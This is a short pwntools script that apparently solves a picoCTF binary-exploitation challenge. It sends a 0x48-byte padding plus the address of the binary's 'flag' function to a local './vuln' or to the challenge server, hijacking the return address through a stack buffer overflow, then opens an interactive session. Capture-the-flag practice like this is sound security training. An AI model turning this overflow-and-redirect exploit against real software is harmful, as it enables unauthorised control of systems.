#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  53540
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x4012cf
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = b"a"*0x48 + p64(exe.sym.flag+5)
# GDB()
p.sendlineafter(b"flag: ", pl)

p.interactive()
